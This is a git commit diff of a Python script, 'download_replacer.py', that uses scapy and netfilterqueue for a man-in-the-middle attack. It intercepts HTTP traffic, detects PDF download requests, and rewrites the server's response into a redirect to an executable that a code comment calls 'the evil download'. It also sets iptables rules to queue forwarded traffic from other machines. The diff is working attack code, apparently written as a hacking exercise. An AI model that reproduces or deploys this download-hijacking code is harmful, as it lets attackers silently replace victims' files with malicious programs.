b3f689420aabb186edec4d1f2798e6287c9d1759
vatojavier <antonioj.casado@estudiante.uam.es>
2019-07-23 13:20:21 +0200

    replacer completed and working fucking perfect :)

--- download_replacer.py
+++ download_replacer.py
@@ -8,21 +8,36 @@ import subprocess
 ack_list = []
 
 
+def set_load(s_packet, load):
+
+    # New link to the evil download
+    s_packet[scapy.Raw].load = load
+    del s_packet[scapy.IP].len
+    del s_packet[scapy.IP].chksum
+    del s_packet[scapy.TCP].chksum
+
+    return s_packet
+
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):  # IF has raw data...
         if scapy_packet[scapy.TCP].dport == 80:
-            print("Request packet")
             if b".pdf" in scapy_packet[scapy.TCP].load:
                 print("Downloading a pdf!")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
 
         elif scapy_packet[scapy.TCP].sport == 80:
-            # Check wether the response packet is the one that responses the request for the download
+            # Check whether the response packet is the one that responses the request for the download
             if scapy_packet[scapy.TCP].seq in ack_list:
-                print("Response packet intercepted")
+
+                mod_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation:  https://www.rarlab.com/rar/winrar-x64-571cro.exe\n\n")
+
+                print("\nResponse packet intercepted and modified: \n")
+
+                print(mod_packet.show())
+                packet.set_payload(bytes(mod_packet))
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print(scapy_packet.show())
 
     packet.accept()
 
@@ -34,7 +49,7 @@ try:
     # trap the incoming packets to a queue that come from other computers while mitm:
     # iptables -I FORDWARD -j queue-num 0
     subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
-    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0;", shell=True)
+    #subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0;", shell=True)
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
     queue.run()
